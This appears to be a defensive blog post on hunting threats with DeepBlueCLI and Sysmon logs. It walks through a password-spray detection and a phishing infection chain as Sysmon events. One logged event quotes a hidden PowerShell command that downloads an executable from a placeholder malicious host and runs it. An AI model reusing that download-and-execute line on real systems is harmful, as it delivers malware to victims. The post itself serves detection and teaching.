---
layout: post
title:  "Threat Hunting with Windows Event Logs & Sysmon"
description: "A brief post on threat hunting using Windows Event Logs"
date:   2020-02-01 11:00:01 +0000
tags: [Blue-Team, SOC, Monitoring, Logging]
---

![Hunting with Sysmon](/blog/assets/search.png)

## DeepBlueCLI
A PowerShell Module for Threat Hunting via Windows Event Logs

Specifically:
 * Windows Security
 * Windows System
 * Windows Application
 * Windows PowerShell
 * Sysmon

Code is available here:
 * [https://github.com/sans-blue-team/DeepBlueCLI](https://github.com/sans-blue-team/DeepBlueCLI)
 
### Deepbluecli usage

#### Process local Windows event logs (PowerShell must be run as Administrator):
Default - read all appropriate logs and filter events:
```
.\DeepBlue.ps1
```

#### Process local Windows security event log

```
.\DeepBlue.ps1 -log security
```

#### Process local Windows system event log:
```
.\DeepBlue.ps1 -log system
```

#### Process an evtx file:
```
.\DeepBlue.ps1 .\evtx\new-user-security.evtx 
```

## Deepbluecli working examples from SANS Kringlecon II
We recently used deepbluecli to solve one of the Kringlecon II challenges. Here we will inspect the results of Deepbluecli a little further to show how easy it is to process security events: 

### Password spray attack

```
Date : 19/11/2019 12:21:46
Log : Security
EventID : 4648
Message : Distributed Account Explicit Credential Use
(Password Spray Attack)
Results : The use of multiple user account access attempts with explicit credentials is an indicator of a password spray attack.
Target Usernames: ygoldentrifle esparklesleigh hevergreen Administrator sgreenbells cjinglebunsvtcandybaubles
bbrandyleaves bevergreen lstripyleaves gchocolatewine ltrufflefig wopenslae mstripysleighvpbrandyberry 
civysparkles sscarletpie ftwinklestockings cstripyfluff gcandyfluff smullingfluff hcandysnaps mbrandybells 
twinterfig supatree civypears ygreenpie ftinseltoes smary ttinselbubbles dsparkleleaves
```

## Deepbluecli working examples
There are many more example in the DeepBlueCli github repository thats publicly available here:
 * [https://github.com/sans-blue-team/DeepBlueCLI/tree/master/evtx](https://github.com/sans-blue-team/DeepBlueCLI/tree/master/evtx)

## Common Incident Response Scenario - Phishing
We will see the actions being recorded with sysmon as the user takes the following actions. 

You will see the following Sysmon Event Ids which are capturing these events.
 * **Event ID 1**: Process creation – This event provides extended information about a newly created process. The full command line provides context on the process execution. The ProcessGUID field is a unique value for this process across a domain to make event correlation easier. The hash is a full hash of the file with the algorithms in the HashType field.
 * **Event ID 11**: FileCreate – This event is useful for any file creation events monitoring autostart locations, like the Startup folder, as well as temporary and download directories, which are common places malware drops during initial infection.
 * **Event ID 15**: FileCreateStreamHash -This event logs when a named file stream is created, and it generates events that log the hash of the contents of the file to which the stream is assigned (the unnamed stream), as well as the contents of the named stream. There are malware variants that drop their executables or configuration settings via browser downloads, and this event is aimed at capturing that based on the browser attaching a Zone.Identifier “mark of the web” stream.

Let’s get started:

### Clicking on a Phishing email link
```
EventID: 1
event_data.ParentCommandLine: “C:\Program Files (x86)\Microsoft Office\Office14\OUTLOOK.EXE”
event_data.Image: C:\Program Files\Internet Explorer\iexplore.exe
event_data.CommandLine: “C:\Program Files\Internet Explorer\iexplore.exe” https://myfakecompany.badmalware.com/1.php?
event_data.User: user_6310
```

 * A phished user (user_6310) clicked on a link within outlook which launched Internet explorer and opened the following website: https://example.badmalware.com

### Downloading Word .doc
```
EventID: 11
event_data.Image: C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE
event_data.TargetFilename: C:\Users\user_6310\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\POHSQH12\6E713D2A.doc
```

 * Internet explorer downloaded a file called 5B713D2A.doc

(Note: There might be logs where it might show as .tmp file as the download might not be completed when the log is recorded)

### Opening Word File
```
EventID: 1
event_data.Image: C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE
event_data.TargetFilename: C:\Users\user_6310\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\POHSQH12\6E713D2A.doc
```

 * User opened (or possibly the users browser auto_opened) 5B713D2A.doc with Microsoft Word.

### Macro-enabled Word document
```
EventID: 1
event_data.ParentImage: C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE
event_data.ParentCommandLine: “C:\Program Files (x86)\Microsoft Office\Office14\WINWORD.EXE” -Embedding
event_data.Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
event_data.CommandLine: powershell -WindowStyle Hidden $webclient = new-object System.Net.WebClient;$myurls = ‘http://example.badmalware.ru/z3FRJz’.Split(‘,’);$path = $env:temp + ‘\65535.exe’;foreach($myurl in $myurls){try{$webclient.DownloadFile($myurl.ToString(), $path);Start-Process $path;break;}catch{}}
event_data.User: user_6310
```

 * The User enabled macros on this document and a powershell command executed.
 * The powershell command downloads an executable file called 65535.exe from http://Malicioussite.su/z3FRJz 

### Payload downloaded via Powershell
```
event_id: 11
event_data.Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
event_data.TargetFilename: C:\Users\user_6310\AppData\Local\Temp\65536.exe
```

 * Powershell downloads and executes the binary 65536.exe to/from C:\Users\user_6310\AppData\Local\Temp\

The badmalware executable is likely now running in memory, and performing additional tasks within the contect of the infected User.  Its possible that the malware could be:
 * sniffing credentials
 * sniffing banking information 
 * bitcoin (or other coin) mining
 * downloading additional malware
 * encrypting the user’s files (ransomware(
 * or establish persistence of some sort. 

At this point you wished you were recording other actions on the endpoint to know exactly what changes were made

## References
 * [https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
 * [https://github.com/MHaggis/sysmon-dfir](https://github.com/MHaggis/sysmon-dfir)
 * [https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1554993664.pdf](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1554993664.pdf)
 * [https://github.com/sans-blue-team/DeepBlueCLI](https://github.com/sans-blue-team/DeepBlueCLI)
